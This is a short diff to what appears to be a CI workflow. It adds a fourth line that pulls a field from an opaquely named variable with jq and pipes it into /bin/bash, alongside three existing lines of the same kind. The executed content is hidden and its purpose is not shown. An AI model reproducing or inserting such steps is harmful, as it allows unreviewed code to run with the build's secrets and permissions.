@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$tx483" | jq -r .oxr14 | /bin/bash
           echo $v728 | jq -r .tb95 | /bin/bash
           echo $mj4607 | jq -r .e91645 | /bin/bash
+          printf '%s' "$uuos2" | jq -r .yb94332 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
